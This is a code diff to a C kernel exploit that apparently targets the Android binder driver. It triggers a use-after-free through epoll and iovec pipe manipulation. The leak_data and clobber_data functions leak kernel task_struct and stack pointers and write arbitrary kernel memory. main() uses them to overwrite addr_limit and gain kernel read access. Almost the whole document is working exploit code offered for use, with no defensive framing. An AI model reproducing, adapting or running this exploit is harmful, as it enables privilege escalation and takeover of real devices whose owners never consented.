@@ -85,6 +85,15 @@ unsigned long iovec_size(struct iovec* iov, int n) {
     return sum;
 }
 
+unsigned long iovec_max_size(struct iovec* iov, int n) {
+    unsigned long m = 0;
+    for (int i=0; i<n; i++) {
+        if (iov[i].iov_len > m)
+            m = iov[i].iov_len;
+    }
+    return m;
+}
+
 int clobber_data(unsigned long payloadAddress, const void *src, unsigned long payloadLength)
 {
   int dummyBufferSize = MAX(UAF_SPINLOCK, PAGE);
@@ -197,21 +206,12 @@ int clobber_data(unsigned long payloadAddress, const void *src, unsigned long pa
 }
 
 
-void leak_data(void* leakBuffer, int leakAmount, unsigned long extraLeakAddress, void* extraLeakBuffer, int extraLeakAmount)
+void leak_data(void* leakBuffer, int leakAmount, 
+    unsigned long extraLeakAddress, void* extraLeakBuffer, int extraLeakAmount,
+    unsigned long* task_struct_ptr, unsigned long* kstack_ptr)
 {
-  if (0 < leakAmount && leakAmount < 16) {
-      err(1, "A non-zero leak must be at least 16 bytes");
-  }
-  if (leakAmount == 0) {
-      char _leakBuffer[16];
-      leakBuffer = _leakBuffer;
-      leakAmount = 16;
-  }
+  unsigned long adjLeakAmount = MAX(leakAmount, 4096+8);
  
-  int dataBufferSize = MAX(UAF_SPINLOCK+leakAmount, PAGE);
-  char* dataBuffer = malloc(dataBufferSize); // TODO: free me!
-  if (dataBuffer == NULL) err(1, "allocating dataBuffer");
-  memset(dataBuffer, 0, dataBufferSize);
   struct epoll_event event = { .events = EPOLLIN };
   if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");
 
@@ -221,28 +221,28 @@ void leak_data(void* leakBuffer, int leakAmount, unsigned long extraLeakAddress,
   
   int delta = (UAF_SPINLOCK+8) % PAGE;
   int paddingSize = (delta == 0 ? 0 : PAGE-delta) + PAGE;
-  
-  char zzz[extraLeakAmount+UAF_SPINLOCK];
-  memset(zzz,'z',extraLeakAmount+UAF_SPINLOCK);
 
-  char fff[extraLeakAmount+UAF_SPINLOCK];
-  memset(fff,'f',extraLeakAmount+UAF_SPINLOCK);
-  fff[0]='F';
-
-  iovec_array[IOVEC_INDX_FOR_WQ-2].iov_base = dataBuffer; 
+  iovec_array[IOVEC_INDX_FOR_WQ-2].iov_base = (unsigned long*)0xDEADBEEF; 
   iovec_array[IOVEC_INDX_FOR_WQ-2].iov_len = PAGE; 
-  iovec_array[IOVEC_INDX_FOR_WQ-1].iov_base = dataBuffer; 
+  iovec_array[IOVEC_INDX_FOR_WQ-1].iov_base = (unsigned long*)0xDEADBEEF; 
   iovec_array[IOVEC_INDX_FOR_WQ-1].iov_len = paddingSize-PAGE; 
-  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dataBuffer;
+  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = (unsigned long*)0xDEADBEEF;
   iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0; /* spinlock: will turn to UAF_SPINLOCK */
-  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = dataBuffer; /* wq->task_list->next */
+  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (unsigned long*)0xDEADBEEF; /* wq->task_list->next */
   iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = leakAmount; /* wq->task_list->prev */
-  iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = zzz; // we shouldn't get to here
+  iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (unsigned long*)0xDEADBEEF; // we shouldn't get to here
   iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = extraLeakAmount+UAF_SPINLOCK; 
   unsigned long totalLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);
+  unsigned long maxLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);
+  unsigned char* dataBuffer = malloc(maxLength);
+  
+  if (dataBuffer == NULL) err(1, "Allocating %ld bytes\n", maxLength);
+  
+  for (int i=0; i<IOVEC_ARRAY_SZ; i++) 
+      if (iovec_array[i].iov_base == (unsigned long*)0xDEADBEEF)
+          iovec_array[i].iov_base = dataBuffer;
   
   int b;
-  
   int pipefd[2];
   int leakPipe[2];
   if (pipe(pipefd)) err(1, "pipe");
@@ -259,21 +259,18 @@ void leak_data(void* leakBuffer, int leakAmount, unsigned long extraLeakAddress,
     printf("CHILD: Doing EPOLL_CTL_DEL.\n");
     epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
     printf("CHILD: Finished EPOLL_CTL_DEL.\n");
+
     // first page: dummy data
+
     unsigned long size1 = paddingSize+UAF_SPINLOCK+8;
     printf("CHILD: initial %lx\n", size1);
     char buffer[size1];
     memset(buffer, 0, size1);
     if (read(pipefd[0], buffer, size1) != size1) err(1, "reading first part of pipe");
+
     unsigned long addr=0;
     memcpy(&addr, buffer+size1-8, 8);
-    printf("---\n");
-    hexdump_memory(buffer+size1-16, 16);
     if (addr == 0) err(1, "bad address");
-/*    unsigned long test = 0x12345678ABCDEF01ul;
-    unsigned long z = 0x999999;
-    clobber_data(&test, &z, 8);
-    printf("test = %lx\n", test); */
     if (extraLeakAmount > 0) {
         unsigned long extra[4] = { 
             addr,
@@ -282,9 +279,7 @@ void leak_data(void* leakBuffer, int leakAmount, unsigned long extraLeakAddress,
             extraLeakAmount, 
         };
         printf("CHILD: clobbering with extra leak address %lx at %lx\n", (unsigned long)extraLeakAddress, addr);
-        //unsigned char z[32];
-        clobber_data(addr, &extra, 24); //sizeof(extra));
-        //hexdump_memory(z,32);
+        clobber_data(addr, &extra, 24); 
         printf("CHILD: clobbered\n");
     }
     if (leakAmount > 8) {
@@ -382,7 +377,7 @@ int main(int argc, char** argv) {
   printf("Leak size %d\n", leakSize);
   unsigned char* leaked = malloc(leakSize);
   if (leaked == NULL) err(1, "Allocating leak buffer");
-  leak_data(leaked, leakSize, 0, NULL, 0);
+  leak_data(leaked, leakSize, 0, NULL, 0, NULL, NULL);
   //hexdump_memory(leaked, leakSize);
   if (leakSize >= 8) {
       printf("tasklist = %lx\n", *(unsigned long *)leaked);
@@ -391,7 +386,7 @@ int main(int argc, char** argv) {
       memcpy(&current_ptr, leaked+0xe8, 8);
       printf("current_ptr = %lx\n", (unsigned long)current_ptr);
       unsigned long kstack = 0xDEADBEEFDEADBEEFul;
-      leak_data(leaked, leakSize, current_ptr+8, &kstack, 8);
+      leak_data(leaked, leakSize, current_ptr+8, &kstack, 8, NULL, NULL);
       kstack &= ~(16384-1);
       hexdump_memory(leaked, leakSize);
       printf("stack = %lx\n", kstack);
@@ -400,16 +395,9 @@ int main(int argc, char** argv) {
       printf("my stack = %lx\n", (unsigned long)&leakSize);
       //printf("Clobbering addr_limit\n");
       unsigned long const src=0xFFFFFFFFFFFFFFFEul;
-/*      unsigned char z = 0xFF;
-      clobber_data(current_ptr+8+7, &z, 1); // REBOOTS!
-      clobber_data(current_ptr+8+6, &z, 1); // REBOOTS!
-      clobber_data(current_ptr+8+5, &z, 1); // REBOOTS!
-      clobber_data(current_ptr+8+4, &z, 1); // REBOOTS! */
-      unsigned long datum;
       clobber_data(kstack+8, &src, 8);
-      printf("wrote = %lx\n", (unsigned long)datum);
       
-      unsigned long current_mm = kernel_read_ulong(current_ptr); //  + OFFSET__task_struct__mm);
+      unsigned long current_mm = kernel_read_ulong(current_ptr); 
       printf("current->mm == 0x%lx\n", current_mm);
   }
   free(leaked);
